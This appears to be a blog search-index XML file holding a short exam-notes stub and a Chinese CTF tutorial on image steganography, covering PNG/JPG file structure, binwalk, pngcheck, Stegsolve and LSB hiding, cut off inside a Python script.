<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1+X知识点总结</title>
    <url>/undefined/1+X%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="1-X知识点总结"><a href="#1-X知识点总结" class="headerlink" title="1+X知识点总结"></a>1+X知识点总结</h1><h2 id="一：工程项目文档编写"><a href="#一：工程项目文档编写" class="headerlink" title="一：工程项目文档编写"></a>一：工程项目文档编写</h2><h3 id="项目流程概述"><a href="#项目流程概述" class="headerlink" title="项目流程概述"></a>项目流程概述</h3><p>项目立项-&gt;项目计划-&gt;需求阶段-&gt;设计阶段-&gt;开发阶段-&gt;测试阶段-&gt;试运行上线-&gt;项目总结</p>
<h3 id="项目角色介绍"><a href="#项目角色介绍" class="headerlink" title="项目角色介绍"></a>项目角色介绍</h3><p>项目角色可以分为项目经理，产品经理，开发经理，测试经理。</p>
<ul>
<li>项目经理为整个项目的核心，推动项目的整个进行，保证项目的交付。</li>
<li>产品经理主要负责设计项目需求，需求必须符合客户的需要。</li>
<li>开发经理主要进行软件设计以及代码实现，顺利的实现项目的要求。</li>
<li>测试经理主要负责对项目的质量进行审查，确保项目质量达到预期目标。</li>
</ul>
<h2 id="二：企业私有网络构建运维"><a href="#二：企业私有网络构建运维" class="headerlink" title="二：企业私有网络构建运维"></a>二：企业私有网络构建运维</h2><h3 id="局域网络技术"><a href="#局域网络技术" class="headerlink" title="局域网络技术"></a>局域网络技术</h3><h4 id="TCP-IP参考模型"><a href="#TCP-IP参考模型" class="headerlink" title="TCP/IP参考模型"></a>TCP/IP参考模型</h4>]]></content>
  </entry>
  <entry>
    <title>Misc-隐写术总结</title>
    <url>/undefined/Misc%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Misc-隐写术总结"><a href="#Misc-隐写术总结" class="headerlink" title="Misc-隐写术总结"></a>Misc-隐写术总结</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学,英文写作Steganography。而密码编码是关于信息加密，即设想到信息可能会被接受者之外的第三方获取而采取的一种措施，通过通信双方预先设定的规则对信息进行加密，使第三方即使获取到信息也无法理解其含义。所以隐写术重点在于信息的隐藏，密码编码重点在于信息的加密，这两者属于完全不同的概念。</p>
<p>[TOC]</p>
<h3 id="图片隐写术"><a href="#图片隐写术" class="headerlink" title="图片隐写术"></a>图片隐写术</h3><p>图片隐写术大致分为下列六类</p>
<ul>
<li><p>一、附加式的图片隐写</p>
</li>
<li><p>二、基于文件结构的图片隐写</p>
</li>
<li><p>三、基于LSB原理的图片隐写</p>
</li>
<li><p>四、基于DCT域的JPG图片隐写</p>
</li>
<li><p>五、数字水印的隐写</p>
</li>
<li><p>六、图片容差的隐写</p>
</li>
<li><p>其他</p>
</li>
</ul>
<hr>
<h4 id="一、附加式的图片隐写"><a href="#一、附加式的图片隐写" class="headerlink" title="一、附加式的图片隐写"></a>一、附加式的图片隐写</h4><h5 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h5><p>附加式的图片隐写通常是我们用某种程序或者方法在图片文件上直接附加被隐写的目标。</p>
<p>程序识别图片的过程是，从文件标识头开始，以文件标识头声明的文件格式所定义的编码格式对数据流进行读取，一直到图片的结束符，当图片处理程序识别到图片的结束符后，不再继续向下识别，所以我们就可以通过在图片结束符后添加数据达到隐写的目的。</p>
<p><strong>附加式图片隐写分类：</strong></p>
<ul>
<li>A丶附加字符串</li>
<li>B丶图种</li>
</ul>
<h5 id="A丶附加字符串"><a href="#A丶附加字符串" class="headerlink" title="A丶附加字符串"></a>A丶附加字符串</h5><p>利用工具将隐藏信息直接写入到图片结束符之后</p>
<p><strong>解法：</strong></p>
<p>strings工具扫描/将图片后缀改为<code>.txt</code>文件，打开查看末尾添加的字符串</p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>正如前文所说，我们这个实验部分讲的是附加字符串的隐写方式，所以我们用Strings检查一下图片</span><br><span class="line"><span class="bullet">- </span>在Strings工具的搜索下，就能得到隐藏在图片末尾的字符串</span><br><span class="line"><span class="comment">//也有可能是经过编码或者加密过后的字符串</span></span><br></pre></td></tr></table></figure></div>

<p><strong>strings使用方法</strong></p>
<p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p>
<p>选项：</p>
<ul>
<li>-a –all：扫描整个文件而不是只扫描目标文件初始化和装载段</li>
</ul>
<ul>
<li>-f –print-file-name：在显示字符串前先显示文件名</li>
<li>-t –radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制</li>
<li>-e –encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit</li>
</ul>
<p><strong>Tips  我们使用strings + 文件名字的命令即可</strong></p>
<p><strong>具体步骤如下：</strong></p>
<p>在kali中输入命令+文件名</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>s /root/桌面/<span class="number">11111.</span>jpg</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/06/11/x4yP9XTFCOzRnkG.png" alt="image-20200611150413169"></p>
<p>有必要提到的是，为什么字符串要附加在文件的后面呢?那是因为，如果图片附加在中间，有可能破坏了图片的信息，如果字符串附加在图片的头部位置，又破坏了文件头，可能导致图片无法识别。关于文件格式的具体内容，我们下一个部分的隐写还会提到。</p>
<h5 id="B丶图种"><a href="#B丶图种" class="headerlink" title="B丶图种"></a>B丶图种</h5><p>一种采用特殊方式将图片文件（如jpg格式）与rar文件结合起来的文件。该文件一般保存为jpg格式，可以正常显示图片；</p>
<p><strong>解法：</strong></p>
<ul>
<li>可以修改文件的后缀名，将图片改为rar压缩文件，并得到其中的数据。</li>
<li>binwalk / foremost分离</li>
</ul>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>对图片进行检测，确认是不是图种</span><br><span class="line"><span class="bullet">- </span>使用binwalk/formost分离图片，得到一个压缩包</span><br><span class="line"><span class="bullet">- </span>打开压缩包得到flag。</span><br></pre></td></tr></table></figure></div>

<p>简单的检测方式:</p>
<p>打开工具中的binwalk。使用如下命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">binwalk </span>cqzb.jpg</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/06/11/ksW5dyzS9hJjntE.png" alt="image-20200611162616711"></p>
<p>我们可以发现，binwalk自动识别出来了zip文件，而且偏移也告诉我们了,当然我们这里可以使用</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">binwalk -e <span class="string">/root/</span>桌面<span class="string">/cqzb.jpg</span></span><br></pre></td></tr></table></figure>

<p>这个命令可以提取出binwalk检测出来的文件</p>
<p><img src="https://i.loli.net/2020/06/11/jIsvnfW5R3oiltL.png" alt="image-20200611162954920"></p>
<p> 但是这里也可以通过另一种方式去提取压缩包，从原理上去提取。这里介绍一个工具<code>winhex16进制编辑器</code>，当然也可以使用其他的16进制编辑器。</p>
<p><strong>使用winhex16进制编辑器提取ZIP文件</strong></p>
<p>首先需要了解一下什么是文件头</p>
<p>文件头就是位于文件开头的一段标识文件类型的数据块</p>
<p><img src="https://i.loli.net/2020/06/11/UQPuHLDokX84Sth.png" alt="image-20200611213803814"></p>
<p>如上图的FF D8 FF就是JPG图片的文件头，一般当我们看到文件开头是如此的格式，我们就能认为这是一个JPG图片了。</p>
<p><img src="https://i.loli.net/2020/06/11/fH3NKpulMb2Aaqy.png" alt="image-20200611214620664"></p>
<p>一般JPG的文件尾以FFD9结尾</p>
<p><img src="https://i.loli.net/2020/06/11/3FryjsmvewA4Zfx.png" alt="image-20200611214339008"></p>
<p>上图 50 4B 03 04就是ZIP文件的文件头，一般以PK表示。</p>
<p>上文我们讲述了，JPG图片的结束标识是FF D9,ZIP文件的文件头是50 4B 03 04，我们只需要在winhex中找到ZIP文件的文件头即可，滑动滚条到最底下。上文讲了一般附加的位置是在原本文件的后面，所以我们果断滑动滚动条到最后。</p>
<p><img src="https://i.loli.net/2020/06/11/rvZlJpfQgFzG7VH.png" alt="image-20200611214741860"></p>
<p>明显此图不是以FF D9结尾，而且在上面发现了ZIP文件的文件头50 4B 03 04，所以不使用binwalk也能判断这是个图种文件。然后接下来我们就需要分离ZIP文件了。</p>
<p><strong>分离ZIP文件</strong></p>
<p>选取从文件头开始到文件尾的所有数据，以16进制数复制到新建的文件中。</p>
<p><img src="https://i.loli.net/2020/06/11/enzkJP9V8q7K3i5.png" alt="image-20200611215154084"></p>
<p><img src="https://i.loli.net/2020/06/11/18LJvrK2Psy9Wpt.png" alt="image-20200611215317247"></p>
<p>然后保存就能得到zip文件。</p>
<hr>
<h4 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h4><h5 id="背景知识："><a href="#背景知识：" class="headerlink" title="背景知识："></a>背景知识：</h5><p>这里的文件结构特指的是图片文件的文件结构。我们这里主要讲的也是PNG图片的文件结构。CTF比赛中也是以PNG图片的隐写为主。</p>
<p>PNG文件结构很简单，主要由数据块组成，最少包含4个数据块。</p>
<p>PNG数据块PNG图片有两种数据块的，一种是关键数据块，另一种是辅助数据块。</p>
<p>正常的关键数据块，定义了4种标准数据块，分别是<font color=red>长度，数据块类型码，数据块数据，循环冗余检测(CRC )</font>font&gt;，每个PNG文件都必须包含它们。</p>
<table>
<thead>
<tr>
<th>PNG标识符</th>
<th>PNG文件头数据块（IHDR）</th>
<th>PNG数据块</th>
<th>…</th>
<th align="left">PNG结尾数据块(IEND)</th>
</tr>
</thead>
<tbody><tr>
<td>89504E470D0A1A0A</td>
<td>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等等。</td>
<td>IDAT 数据块、辅助数据块</td>
<td></td>
<td align="left">000000004945 4E44AE426082</td>
</tr>
</tbody></table>
<ul>
<li>PNG标识符<code>89504E470D0A1A0A</code>总是在文件头部，用于标识这是一个PNG图片。</li>
<li>PNG文件头数据块IHDR，它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</li>
<li>PNG数据块IDAT，它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</li>
<li>PNG结束数据块IEND：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</li>
</ul>
<p><strong>IHDR数据块构成：</strong></p>
<table>
<thead>
<tr>
<th><strong>域的名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Width</td>
<td>4 bytes</td>
<td>图像宽度，以像素为单位</td>
</tr>
<tr>
<td>Height</td>
<td>4 bytes</td>
<td>图像高度，以像素为单位</td>
</tr>
<tr>
<td>Bit depth</td>
<td>1 byte</td>
<td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td>
</tr>
<tr>
<td>ColorType</td>
<td>1 byte</td>
<td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td>
</tr>
<tr>
<td>Compression method</td>
<td>1 byte</td>
<td>压缩方法(LZ77派生算法)</td>
</tr>
<tr>
<td>Filter method</td>
<td>1 byte</td>
<td>滤波器方法</td>
</tr>
<tr>
<td>Interlace method</td>
<td>1 byte</td>
<td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td>
</tr>
</tbody></table>
<p>这里我们需要重点关注的是宽和高的数据</p>
<p><strong>首先举个例子：</strong></p>
<p><img src="https://i.loli.net/2020/06/11/f2m5RXLUjCukob7.png" alt="image-20200611223017816"></p>
<p><strong>PNG标识符：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">89504E470</span>D0A1A0A</span><br></pre></td></tr></table></figure></div>

<p>表示这是一个PNG文件</p>
<p><strong>接下来是IHDR数据块</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D</span><br><span class="line"><span class="comment">//表示IHDR头快长度为13(16进制编辑器，D表示13)</span></span><br><span class="line"><span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span></span><br><span class="line"><span class="comment">//IHDR标识，表示这是一个IHDR数据块</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">03</span> E8 </span><br><span class="line"><span class="comment">//表示PNG图像的宽，16^2*3+16^1*14+16^0*8=1000像素</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">32</span> </span><br><span class="line"><span class="comment">//表示PNG图像的高，16^2*2+16^1*3+16^0*2=562像素</span></span><br><span class="line"><span class="number">08</span> </span><br><span class="line"><span class="comment">//表示图像深度，这里是2^8=256，即这是一个256色的图像</span></span><br><span class="line"><span class="number">06</span> </span><br><span class="line"><span class="comment">//颜色类型，查表可知这是带α通道数据的真彩色图像</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"><span class="comment">//压缩方法</span></span><br><span class="line"><span class="number">00</span> </span><br><span class="line"><span class="comment">//PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法（LZ77派生 算法）</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"><span class="comment">//滤波器方法</span></span><br><span class="line"><span class="number">58</span> <span class="number">71</span> E0 <span class="number">19</span></span><br><span class="line"><span class="comment">//CRC校验</span></span><br></pre></td></tr></table></figure></div>

<p>接下来的是不重要的数据块，我们只需要知道知道再之后就会有IDAT数据块</p>
<p><strong>IDAT数据块</strong></p>
<p><img src="https://i.loli.net/2020/06/11/szkZJOCmnRvrhfH.png" alt="image-20200611230506506"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">8</span>A</span><br><span class="line"><span class="comment">//表示IDAT数据块的长度为8A=16^1*8+16^0*10=138字节</span></span><br><span class="line"><span class="number">49</span> <span class="number">44</span> <span class="number">41</span> <span class="number">54</span></span><br><span class="line"><span class="comment">//IDAT数据块标识符,表示这是一个IDAT数据块</span></span><br><span class="line">接下去的数据是真正的数据</span><br><span class="line">D9 CF A5 A8 </span><br><span class="line"><span class="comment">//CRC校验码</span></span><br></pre></td></tr></table></figure></div>

<h5 id="常用工具："><a href="#常用工具：" class="headerlink" title="常用工具："></a>常用工具：</h5><ul>
<li>winhex</li>
<li>010Editor</li>
<li>pngcheck</li>
<li>binwalk</li>
</ul>
<p><strong>基于文件结构的图片隐写分类：</strong></p>
<ul>
<li>高度被修改引起的隐写</li>
<li>隐写信息以IDAT块加入图片</li>
</ul>
<h5 id="A-高度被修改引起的隐写"><a href="#A-高度被修改引起的隐写" class="headerlink" title="A.高度被修改引起的隐写"></a>A.高度被修改引起的隐写</h5><p>背景知识中，我们了解到，图片的高度，宽度的值存放于PNG图片的IHDR数据块，那么我们就是可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p>
<p><strong>解法：</strong></p>
<p>使用winhex或010Editor等16进制编辑器修改图片高度，调大一点</p>
<p><strong>技巧：</strong></p>
<p>一般的高度修改的图片不会修改IHDR的CRC校验码，在windows下，不会检查CRC校验码，图片能正常显示，但在Linux下，图片查看器会检查图片的CRC校验码，所以可以将图片拖入到Linux中去查看校验</p>
<p>当然可能会把CRC校验码也重新计算过，就不能用这种方法了。</p>
<p>这里介绍一款工具，能计算CRC校验码：</p>
<p><strong>CRC Calculator</strong></p>
<p><img src="https://i.loli.net/2020/06/12/ANukZKTzxjcHeYX.png" alt="image-20200612133558161"></p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>正如前文所说，我们这个实验部分讲的是图片高度值被修改引起的的隐写方式，所以我们winhex</span><br><span class="line"><span class="bullet">- </span>在winhex运行PNG图片，这样方便于我们修改PNG图片的高度值</span><br><span class="line"><span class="bullet">- </span>找到PNG图片高度值对应的地方，然后修改为一个较大的值，并保存文件</span><br><span class="line"><span class="bullet">- </span>打开保存后的图片，发现底部看到了之前被隐写的信息</span><br></pre></td></tr></table></figure></div>

<p>原图：<img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132510439.png" alt="image-20200612132510439"></p>
<p>修改高度</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132547621.png" alt="image-20200612132547621"></p>
<p>修改为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASIC"><figure class="iseeu highlight /basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">02</span> FF</span><br></pre></td></tr></table></figure></div>

<p>得到flag：</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132759250.png" alt="image-20200612132759250"></p>
<p><strong>思考：</strong></p>
<ol>
<li>如果修改的是宽度该怎么修复呢？                  ————————–通过爆破未被修改的CRC校验码得到原始宽度</li>
<li>JPG图片是否也有这样的隐写形式呢？</li>
<li>了解JPG以及GIF等图片文件的格式。</li>
</ol>
<h5 id="B-隐写信息以IDAT块加入图片"><a href="#B-隐写信息以IDAT块加入图片" class="headerlink" title="B.隐写信息以IDAT块加入图片"></a>B.隐写信息以IDAT块加入图片</h5><p>在背景知识中，我们提到了一个重要的概念就是图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形式加入图片。</p>
<p>这里再次提一下IDAT数据块的格式：</p>
<table>
<thead>
<tr>
<th align="left">IDAT数据块长度</th>
<th align="left">IDAT数据块标识</th>
<th align="left">IDAT数据</th>
<th align="left">CRC校验码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">00 00 00 B3</td>
<td align="left">49 44 41 54</td>
<td align="left">50 4B …….00 00</td>
<td align="left">24 9B 7C 31</td>
</tr>
</tbody></table>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612135623777.png" alt="image-20200612135623777"></p>
<p><strong>解法：</strong></p>
<p>首先可以通过<code>pngcheck</code>检测是否有异常的数据块，一般的IDAT数据块都是连续的数据块。</p>
<p>然后查看偏移量找到数据块的位置，提取IDAT数据块进行分析</p>
<p><strong>实验：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>使用pngcheck先对图片检测</span><br><span class="line"><span class="bullet">- </span>在pngcheck的检测下，我们会发现异常信息，我们对异常的块进行提取</span><br><span class="line"><span class="bullet">- </span>查看数据块偏移量，找到IDAT数据块</span><br><span class="line"><span class="bullet">- </span>提取数据块</span><br><span class="line"><span class="bullet">- </span>分析数据块</span><br></pre></td></tr></table></figure></div>

<p><strong>前景知识</strong><br>pngcheck可以验证PNG图片的完整性（通过检查内部CRC-32校验和&bra;比特&ket;)和解压缩图像数据；它能够转储几乎所有任选的块级别信息在该图像中的可读数据。<br>我们使用<code>pngcheck -v xxx.png</code>如此的命令对图片进行检测</p>
<p><strong>使用pngcheck对图片进行检测</strong></p>
<p><img src="https://i.loli.net/2020/06/12/3HJW2Zj9ScwreLn.png" alt="image-20200612141052876"></p>
<p>可以发现原本连续的数据块都是32768的大小，然后15871，然后后面还有一个179大小的数据块，说明这个数据块有异常。</p>
<p><strong>提取数据块</strong></p>
<p>将数据块内容复制粘贴到新的文件中</p>
<p><img src="https://i.loli.net/2020/06/12/GJOfTlxgCrLqt6V.png" alt="image-20200612141345571"></p>
<p><strong>分析数据块：</strong></p>
<p><img src="https://i.loli.net/2020/06/12/A5eu2Hsc7n3NwEg.png" alt="image-20200612141439513"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASIC"><figure class="iseeu highlight /basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">50 </span><span class="number">4</span>B <span class="number">03</span> <span class="number">04</span></span><br></pre></td></tr></table></figure></div>

<p>说明这是一个ZIP压缩包，改后缀名得到zip文件</p>
<p><img src="https://i.loli.net/2020/06/12/ZEBcTWJiazyG9qV.png" alt="image-20200612141914384"></p>
<p>发现提示需要密码，由于题目没有更多信息提示，所以先检查ZIP文件格式，查看压缩包是否是伪加密</p>
<p>提示：伪加密的压缩包可以用360压缩打开，也可以修复压缩包的方法打开或者修改数据；</p>
<p>伪加密是通过将第二个14后面的00 00 修改为14 00 09实现，只要将09修改成00就能破解，具体原理可以搜索zip伪加密实现</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612143639110.png" alt="image-20200612143639110"></p>
<p><em>思考</em></p>
<ol>
<li>我们是否可以将一张二维码以IDAT块的形式写入图片呢？</li>
<li>试着自己将信息以IDAT块的形式写入图片—————–需要添加长度和CRC校验</li>
</ol>
<hr>
<h4 id="三、基于LSB原理的图片隐写"><a href="#三、基于LSB原理的图片隐写" class="headerlink" title="三、基于LSB原理的图片隐写"></a>三、基于LSB原理的图片隐写</h4><h5 id="背景知识-1"><a href="#背景知识-1" class="headerlink" title="背景知识"></a>背景知识</h5><p>网络上有很多博文抄来抄去也写的不清楚，然后我也找了很久才搞懂。</p>
<p>LSB，最低有效位。我们知道图像像素一般是由RGB三原色（即红绿蓝）组成的，每一种颜色占用8位，0x00~0xFF，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量中最低的二进制位的时候，我们的肉眼是区分不出来的</p>
<p>三原色，每种颜色占8位</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"> <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span>   |   <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span>   <span class="number">0</span></span><br><span class="line"><span class="number">2</span>^<span class="number">7</span>      ...........        <span class="number">2</span>^<span class="number">1</span> <span class="number">2</span>^<span class="number">0</span></span><br><span class="line"><span class="comment">//一原色就一共有2^8=256种颜色，三原色就是256^3种颜色</span></span><br><span class="line">当我们修改每种颜色的最低位二进制位<span class="number">2</span>^<span class="number">0</span>时，我们的肉眼区分不出来，所以就可以通过修改最低位达到隐写数据的目的</span><br></pre></td></tr></table></figure></div>

<p><strong>出题思路：</strong></p>
<ul>
<li>可以通过对某一颜色的某一个二进制位进行存储0或1 ，存储成这一通道(即二进制位)的黑白图片</li>
<li>可以在三个颜色通道的最低有效位存储0或1数据，存入图片数据或者其他数据</li>
</ul>
<h5 id="常用工具：-1"><a href="#常用工具：-1" class="headerlink" title="常用工具："></a>常用工具：</h5><ul>
<li>Stegosolve</li>
</ul>
<p><strong>Stegosolve介绍</strong><br>CTF中，最常用来检测LSB隐写痕迹的工具是Stegsolve，这是一款可以对图片进行多种操作的工具，包括对图片进行xor,sub等操作，对图片不同通道进行查看等功能。</p>
<p><strong>基于LSB原理的图片隐写</strong></p>
<ul>
<li>简单的LSB隐写</li>
<li>有一点难度的LSB隐写</li>
</ul>
<h5 id="A-简单的LSB隐写"><a href="#A-简单的LSB隐写" class="headerlink" title="A.简单的LSB隐写"></a>A.简单的LSB隐写</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="bullet">- </span>双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line"><span class="bullet">- </span>使用Stegsolve打开图片，在不同的通道查看图片</span><br><span class="line"><span class="bullet">- </span>在通道切换的过程中，我们看到了flag</span><br><span class="line"><span class="bullet">- </span>最后的flag是flag:key&#123;forensics<span class="emphasis">_is_</span>fun&#125;</span><br></pre></td></tr></table></figure></div>

<p>用Stegsolve打开图片，并在不同的通道中切换</p>
<p><img src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612150014122.png" alt="image-20200612150014122"></p>
<p>最后在发现Red的2^0位上隐写了数据</p>
<p>flag是flag:key{forensics_is_fun}</p>
<p><strong>思考</strong></p>
<ol>
<li>我们如何实现这种LSB隐写的？是否可以通过photoshop这样的工具实现？</li>
<li>查阅更多关于LSB隐写的资料。</li>
</ol>
<h5 id="B-有一点难度的LSB隐写"><a href="#B-有一点难度的LSB隐写" class="headerlink" title="B.有一点难度的LSB隐写"></a>B.有一点难度的LSB隐写</h5><p>我们从第一个部分可以知道，最简单的隐写我们只需要通过工具Stegsolve切换到不同通道，我们就可以直接看到隐写内容了，那么更复杂一点就不是这么直接了，而是只能用工具来查看LSB的隐写痕迹，再通过工具或者脚本的方式提取隐写信息。</p>
<p>可以通过Stegsolve来查看最低有效位数据：</p>
<p>也可以进行导出</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Analyse</span>中的<span class="meta">Data</span> Extract模块</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2020/06/12/k9tZ23uTpOe8Qma.png" alt="image-20200612154608945"></p>
<p><strong>python脚本实现最低有效位隐藏算法：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta"># -*- coding: UTF-8 -*-</span></span><br><span class="line">from PIL import Image</span><br><span class="line">def plus(<span class="keyword">str</span>):</span><br><span class="line">      <span class="meta">#Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">str</span>.zfill(<span class="number">8</span>) </span><br><span class="line">def get_key(strr):</span><br><span class="line">      <span class="meta">#获取要隐藏的文件内容</span></span><br><span class="line">    tmp = strr</span><br><span class="line">    f = file(tmp,<span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">str</span> = <span class="string">""</span></span><br><span class="line">    s = f.read()</span><br><span class="line">    <span class="keyword">for</span> i in range(len(s)):</span><br><span class="line">         <span class="meta">#逐个字节将要隐藏的文件内容转换为二进制，并拼接起来</span></span><br><span class="line">         <span class="meta">#1.先用ord()函数将s的内容逐个转换为ascii码</span></span><br><span class="line">         <span class="meta">#2.使用bin()函数将十进制的ascii码转换为二进制</span></span><br><span class="line">         <span class="meta">#3.由于bin()函数转换二进制后，二进制字符串的前面会有"0b"来表示这个字符串是二进制形式，所以用replace()替换为空</span></span><br><span class="line">         <span class="meta">#4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位</span></span><br><span class="line">        <span class="keyword">str</span> = <span class="keyword">str</span>+plus(bin(ord(s[i])).replace(<span class="string">'0b'</span>,<span class="string">''</span>))</span><br><span class="line">        <span class="meta">#print str</span></span><br><span class="line">    f.closed</span><br><span class="line">    <span class="keyword">return</span> <span 